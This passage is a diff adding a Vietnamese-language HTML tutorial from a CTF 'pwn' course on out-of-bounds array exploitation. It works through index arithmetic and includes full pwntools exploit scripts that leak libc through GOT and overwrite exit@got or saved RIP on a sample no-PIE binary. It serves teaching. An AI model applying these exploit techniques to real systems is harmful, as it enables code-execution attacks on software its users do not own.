@@ -1,0 +1,471 @@
+<title>Out-of-Bounds</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,46px);line-height:1.03;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.arrvis{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0;font-family:var(--font-mono);font-size:12.5px}
+.arrvis input{font-family:var(--font-mono);font-size:14px;padding:6px 9px;border:1px solid var(--line);border-radius:6px;background:var(--surface);color:var(--fg);width:90px}
+.arrvis .cells{display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.arrvis .c{display:grid;grid-template-columns:120px 90px 1fr;gap:8px;border:1px solid var(--line);border-radius:6px;padding:6px 10px;background:var(--surface)}
+.arrvis .c.arr{border-left:3px solid var(--mem)}
+.arrvis .c.hit{background:var(--accent-soft);border-color:var(--accent);font-weight:700}
+.arrvis .c .a{color:var(--mem)}
+.arrvis .msg{color:var(--mem);margin-top:6px}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 1 · Bài 4</div>
+    <h1>Out-of-Bounds</h1>
+    <p class="sub">Truy cập mảng với <strong>chỉ số ngoài biên</strong> (âm hoặc quá lớn): <code>arr[idx]</code> với idx attacker chọn → đọc/ghi vào <mark>bất kỳ địa chỉ</mark> = <code>arr + idx*size</code>. Khác overflow (tuyến tính), OOB cho <strong>đọc-ghi có chủ đích</strong> tại offset tùy ý — một nguyên thủy cực mạnh. Bài này: số thật, OOB tới GOT.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Nền tảng–Trung (Phase 1)</span>
+      <span class="chip"><b>Binary mẫu:</b> x86-64 no-PIE</span>
+      <span class="chip"><b>Cần trước:</b> <a href="integer_bugs.html" style="color:inherit">integer bugs</a></span>
+      <span class="chip"><b>Thời lượng:</b> ~45 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Tính địa chỉ</a><a href="#s4">04 Đọc & ghi</a><a href="#s5">05 Mô phỏng</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>OOB:</strong> <code>int arr[10]; arr[idx]</code> với <code>idx</code> do attacker chọn mà không kiểm biên → truy cập <code>arr + idx*4</code> = địa chỉ tùy ý. <code>idx</code> âm → trước mảng; <code>idx</code> lớn → sau mảng.</p>
+    <p><strong>Đọc (OOB read):</strong> leak giá trị tại offset — leak canary, libc (GOT), con trỏ. <strong>Ghi (OOB write):</strong> ghi giá trị vào GOT/saved RIP/biến → chiếm luồng.</p>
+    <p><strong>Sức mạnh:</strong> khác overflow (chỉ ghi liền kề), OOB <em>nhảy thẳng</em> tới đích. Thường = arbitrary read/write ngay.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>arr[idx] = *(arr + idx*size). Chọn idx để đọc/ghi địa chỉ bạn muốn (GOT, canary...).</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🔎 Nhận dạng</span>
+<pre><code>int idx; scanf("%d",&idx);
+arr[idx] = val;        // KHÔNG check 0&lt;=idx&lt;N → OOB write
+printf("%d", arr[idx]); // OOB read</code></pre></div>
+      <div class="combat-row"><span class="lab">📐 Tính index tới đích</span>
+<pre><code>idx = (target - arr_base) / elem_size
+# arr tại 0x404060, elem 8 byte, GOT puts tại 0x404018:
+# idx = (0x404018 - 0x404060) / 8 = -9   (âm = trước mảng)</code></pre></div>
+      <div class="combat-row"><span class="lab">💧 OOB read → leak</span>
+        <p>Đọc <code>arr[idx]</code> với idx trỏ tới GOT → leak libc. Hoặc tới canary slot → leak canary.</p></div>
+      <div class="combat-row"><span class="lab">🎯 OOB write → control</span>
+        <p>Ghi <code>arr[idx] = win</code> với idx trỏ GOT entry (vd exit@got) → gọi hàm đó chạy win. Hoặc ghi saved RIP.</p></div>
+      <div class="combat-row"><span class="lab">⚠️ Nhớ</span>
+        <p>index <b>âm</b> = trước mảng (dùng số âm/unsigned lớn). elem_size nhân vào (int=4, void*=8). Alignment: đích phải chia hết elem_size (nếu không, lệch — chọn đích khác).</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2><code>arr[idx]</code> = số học con trỏ</h2>
+  <p>Trong C, <code>arr[idx]</code> chỉ là cú pháp cho <code>*(arr + idx)</code> — và <code>arr + idx</code> tự nhân <code>idx</code> với <strong>kích thước phần tử</strong>. Với <code>int arr[]</code> (phần tử 4 byte): <code>arr[idx]</code> = địa chỉ <code>arr + idx*4</code>. Nếu không kiểm <code>0 ≤ idx &lt; N</code>, attacker chọn idx để con trỏ trỏ <em>ra ngoài mảng</em> — tới GOT, stack, biến global khác. <span class="mem-term">OOB</span> = truy cập ngoài biên.</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">OOB</div><p>Out-of-bounds: truy cập ngoài biên mảng.</p></div>
+    <div class="card"><div class="term">OOB read</div><p>Đọc offset tùy ý → leak.</p></div>
+    <div class="card"><div class="term">OOB write</div><p>Ghi offset tùy ý → control.</p></div>
+    <div class="card"><div class="term">elem_size</div><p>Kích thước phần tử (nhân vào idx).</p></div>
+    <div class="card"><div class="term">index âm</div><p>idx&lt;0 → trước mảng.</p></div>
+    <div class="card"><div class="term">arbitrary R/W</div><p>Đọc/ghi địa chỉ bất kỳ.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Mạnh hơn overflow</h2>
+  <p>Buffer overflow ghi <em>tuyến tính</em> (phải lấp hết từ buffer tới đích, đi qua canary). OOB thì <strong>nhảy thẳng</strong> tới địa chỉ mong muốn qua một con số index — không chạm canary, không cần lấp. Một OOB read+write thường là <strong>arbitrary read/write ngay</strong>, nguyên thủy mạnh nhất. Vì vậy đề "menu chỉnh sửa phần tử theo index" rất hay giấu OOB: thiếu một dòng <code>if (idx &lt; N)</code> là đủ.</p>
+ </div>
+</section>
+
+<!-- 03 Tính địa chỉ -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / TÍNH ĐỊA CHỈ · MỤC LÕI</div>
+  <h2>index = (đích − base) / elem_size (số thật)</h2>
+  <figure class="dg">
+  <svg viewBox="0 0 600 120" role="img" aria-label="mảng tại 0x404060; index âm trỏ về GOT tại địa chỉ thấp hơn; index dương vượt mảng" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <g font-family="monospace" font-size="10.5">
+    <rect x="30" y="44" width="110" height="34" rx="6" stroke-width="1.6" stroke="#e8663e"/><text x="85" y="60" text-anchor="middle" fill="#e8663e" stroke="none">GOT (0x404018)</text><text x="85" y="73" text-anchor="middle" fill="#e8663e" stroke="none">idx = -9</text>
+    <rect x="240" y="44" width="110" height="34" rx="6" stroke-width="1.6" stroke="var(--mem)"/><text x="295" y="60" text-anchor="middle" fill="var(--mem)" stroke="none">arr[0] (0x404060)</text><text x="295" y="73" text-anchor="middle" fill="var(--mem)" stroke="none">idx = 0</text>
+    <rect x="450" y="44" width="120" height="34" rx="6" stroke-width="1.3"/><text x="510" y="60" text-anchor="middle" fill="currentColor" stroke="none">global khác</text><text x="510" y="73" text-anchor="middle" fill="currentColor" stroke="none">idx &gt; N</text>
+    <line x1="240" y1="61" x2="142" y2="61" stroke="#e8663e" stroke-width="1.4" marker-end="url(#ao)"/>
+    <line x1="350" y1="61" x2="448" y2="61" stroke-width="1.3"/>
+    </g>
+    <defs><marker id="ao" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#e8663e" stroke="none"/></marker></defs>
+    <text x="300" y="104" font-size="11" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.72">index âm → địa chỉ thấp hơn (GOT); index lớn → vượt mảng. arr+idx*8.</text>
+  </svg>
+  <figcaption>index âm/dương trỏ ra ngoài mảng tới GOT/global khác.</figcaption>
+  </figure>
+  <h3>Ví dụ số thật</h3>
+  <pre><code><span class="c"># long arr[16] tại 0x404060 (elem 8 byte); muốn chạm puts@got = 0x404018</span>
+idx = (<span class="d">0x404018</span> - <span class="d">0x404060</span>) / <span class="d">8</span> = (-<span class="d">0x48</span>) / <span class="d">8</span> = -<span class="d">9</span>
+<span class="c"># arr[-9] = *(0x404060 + (-9)*8) = *(0x404018) = puts@got</span>
+<span class="c"># đọc arr[-9] → leak libc ; ghi arr[-9]=win → đổi puts thành win</span></code></pre>
+  <div class="note tip"><span class="tag">Alignment</span>Đích phải căn <code>elem_size</code> so với base: <code>(đích − base) % elem_size == 0</code>. Nếu không chia hết → index lẻ → lệch byte. Chọn đích căn, hoặc dùng mảng byte (elem 1) để tới mọi địa chỉ.</div>
+ </div>
+</section>
+
+<!-- 04 Đọc ghi -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / ĐỌC & GHI</div>
+  <h2>Hai nguyên thủy</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>OOB read → leak</h4>
+    <pre><code><span class="c"># menu "show arr[i]" → nhập i = -9 → in ra puts@got = libc leak</span>
+<span class="c"># hoặc i trỏ canary slot → leak canary</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>OOB write → control</h4>
+    <pre><code><span class="c"># menu "set arr[i]=v" → i trỏ GOT entry hàm sắp gọi, v = win/system</span>
+<span class="c"># vd exit@got = win : khi exit() chạy → gọi win()</span></code></pre></div></div>
+  <div class="note warn"><span class="tag">Full RELRO?</span>Nếu GOT read-only (Full RELRO): OOB write không ghi GOT được → nhắm saved RIP trên stack (nếu mảng gần stack), hoặc <code>__exit_funcs</code>/hook. OOB read vẫn leak GOT được (chỉ đọc).</div>
+ </div>
+</section>
+
+<!-- 05 Mô phỏng -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Máy tính index OOB</h2>
+  <p>Nhập địa chỉ base mảng, elem size, địa chỉ đích → ra index cần dùng (kèm cảnh báo alignment).</p>
+  <div class="lab">
+    <div class="arrvis" id="av">
+      <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:flex-end">
+        <div><label style="font-size:11px;color:var(--muted);display:block">base mảng</label><input id="baseIn" value="0x404060"></div>
+        <div><label style="font-size:11px;color:var(--muted);display:block">elem size</label><input id="elemIn" value="8" style="width:60px"></div>
+        <div><label style="font-size:11px;color:var(--muted);display:block">đích</label><input id="tgtIn" value="0x404018"></div>
+      </div>
+      <div class="cells" id="cells"></div>
+      <div class="msg" id="avmsg"></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Mảng, biên, đích</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Mảng &amp; elem_size</h4>
+    <pre><code><span class="c"># IDA/gdb: địa chỉ mảng global, kích thước phần tử (4/8)</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Có check biên?</h4>
+    <pre><code><span class="c"># cmp idx, N ; jae/jge → có check. Thiếu / signed → OOB</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Đích đọc/ghi</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> exe.got.puts, exe.got.exit   <span class="c"># GOT để leak/ghi</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>OOB read leak + OOB write GOT (số thật)</h2>
+  <pre><code><span class="c">// vuln.c — gcc vuln.c -o vuln -fno-stack-protector -no-pie (Partial RELRO)</span>
+<span class="k">long</span> arr[<span class="d">16</span>];   <span class="c">// global tại 0x404060</span>
+<span class="c">// menu: 1-show arr[i]  2-set arr[i]=v   (KHÔNG check biên)</span></code></pre>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · read leak + write</button>
+    <button class="tab" data-t="b">B · OOB write ret</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — OOB read leak libc, OOB write exit@got = win (hoặc system).</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe  = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+ARR  = <span class="d">0x404060</span>; ELEM = <span class="d">8</span>
+<span class="k">def</span> idx_of(addr): <span class="k">return</span> (addr - ARR)//ELEM    <span class="c"># index tới addr</span>
+<span class="k">def</span> show(i): p.sendlineafter(b<span class="s">"&gt;"</span>,b<span class="s">"1"</span>); p.sendline(<span class="k">str</span>(i).encode()); <span class="k">return</span> <span class="k">int</span>(p.recvline())
+<span class="k">def</span> setv(i,v): p.sendlineafter(b<span class="s">"&gt;"</span>,b<span class="s">"2"</span>); p.sendline(<span class="k">str</span>(i).encode()); p.sendline(<span class="k">str</span>(v).encode())
+
+<span class="c"># 1) leak libc: OOB read puts@got (idx = -9)</span>
+leak = show(idx_of(exe.got.puts))         <span class="c"># arr[-9] = puts thật</span>
+libc.address = leak - libc.sym.puts
+log.success(<span class="s">f"libc = {hex(libc.address)}"</span>)
+
+<span class="c"># 2) OOB write: exit@got = system (khi exit → system(?) ... hoặc = one_gadget)</span>
+setv(idx_of(exe.got.exit), libc.sym.system)
+<span class="c"># hoặc ghi = one_gadget: setv(idx_of(exe.got.puts), libc.address+0xe3b01)</span>
+p.sendlineafter(b<span class="s">"&gt;"</span>, b<span class="s">"3"</span>)              <span class="c"># trigger exit → gọi hàm đã ghi</span>
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span><code>ARR=0x404060</code>, <code>exit@got</code> trigger là của binary mẫu. idx tính bằng <code>(addr−ARR)//ELEM</code>. Ghi one_gadget vào GOT hàm sắp gọi tiện hơn system (khỏi set rdi). Full RELRO → không ghi GOT; nhắm stack/hook.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — OOB write thẳng saved RIP (nếu mảng trên stack).</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>); p = process(exe.path)
+<span class="c"># mảng cục bộ trên stack: idx dương vượt mảng tới saved RIP</span>
+<span class="c"># idx_rip = (saved_rip_addr - arr_stack_addr)//8  (đo bằng gdb)</span>
+setv(idx_rip, exe.sym.win)                <span class="c"># ghi saved RIP = win</span>
+<span class="c"># khi hàm return → win() (không cần leak nếu no-PIE)</span>
+p.interactive()</code></pre>
+<div class="note tip"><span class="tag">Mảng stack</span>Nếu mảng là biến cục bộ (trên stack), index dương tới saved RIP → OOB write = ret2win trực tiếp, KHỎI qua canary (nhảy thẳng). Rất gọn.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+exe = ELF(<span class="s">"./vuln"</span>,checksec=<span class="k">False</span>); libc=get_libc(<span class="s">"./libc.so.6"</span>); p=start()
+ARR=<span class="d">0x404060</span>; idx=<span class="k">lambda</span> a:(a-ARR)//<span class="d">8</span>
+<span class="c"># ... show/setv như A ...</span>
+rebase_libc(leak=show(idx(exe.got.puts)), sym=<span class="s">"puts"</span>)
+setv(idx(exe.got.exit), LIBC.sym.system)
+sla(b<span class="s">"&gt;"</span>,b<span class="s">"3"</span>); ia()</code></pre>
+<div class="note"><span class="tag">pwnld</span><code>rebase_libc</code> trừ offset. Phần tính idx là kiến thức bài này.</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Index lệch</h4><p>Đích không căn elem_size. (đích−base)%elem≠0. Chọn đích căn.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Index âm bị chặn</h4><p>Có check idx>=0. Dùng index dương vượt, hoặc tìm chỗ khác.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Full RELRO ghi GOT crash</h4><p>Nhắm stack RIP/hook thay GOT.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">IDA 9.1 Pro</div><h4>Mảng & biên</h4><p>Địa chỉ arr, check idx.</p></div>
+    <div class="card"><div class="term">gdb</div><h4>Đo offset</h4><p>arr → saved RIP/GOT.</p></div>
+    <div class="card"><div class="term">pwntools got/sym</div><h4>Đích</h4><p>exe.got.*, libc.sym.*.</p></div>
+    <div class="card"><div class="term">checksec</div><h4>RELRO</h4><p>GOT ghi được?</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi OOB không ăn</h2>
+  <div class="grid">
+    <div class="card"><h4>Index lệch</h4><p>Alignment. (đích−base)%elem.</p></div>
+    <div class="card"><h4>Index bị chặn</h4><p>Có check biên. Thử signed/khác.</p></div>
+    <div class="card"><h4>Full RELRO</h4><p>GOT read-only. Nhắm stack/hook.</p></div>
+    <div class="card"><h4>Leak sai</h4><p>Đọc nhầm ô. Kiểm GOT đã resolve chưa.</p></div>
+    <div class="card"><h4>elem_size nhầm</h4><p>int=4, long/void*=8. Nhân đúng.</p></div>
+    <div class="card"><h4>Ghi không trigger</h4><p>Hàm GOT chưa được gọi lại. Chọn hàm sắp gọi.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & NHẬN DIỆN</div>
+  <h2>OOB ở đâu</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Vị trí mảng</th><th>OOB tới đâu</th></tr></thead>
+    <tbody>
+      <tr><td>global (bss/data)</td><td>GOT (leak/ghi), global khác</td></tr>
+      <tr><td>stack (cục bộ)</td><td>saved RIP, canary, biến khác</td></tr>
+      <tr><td>heap</td><td>chunk kế, metadata (→ heap bug)</td></tr>
+      <tr><td>Index từ integer bug</td><td>index âm/lớn (xem <a href="integer_bugs.html">integer_bugs</a>)</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">Kiến trúc</span>elem_size theo kiểu (int 4, long/ptr 8). x86 (32-bit): ptr 4 byte → idx tính /4. Nguyên lý arr+idx*size giống nhau.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐ · OOB read leak</div><p>arr[-9] đọc puts@got → libc. Rebase.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · OOB write GOT</div><p>Ghi exit@got = one_gadget, trigger exit.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · OOB write RIP</div><p>Mảng stack: index dương ghi saved RIP = win.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">OOB</div><p>Truy cập ngoài biên mảng.</p></div>
+    <div class="card"><div class="term">OOB read/write</div><p>Đọc/ghi offset tùy ý.</p></div>
+    <div class="card"><div class="term">elem_size</div><p>Kích thước phần tử.</p></div>
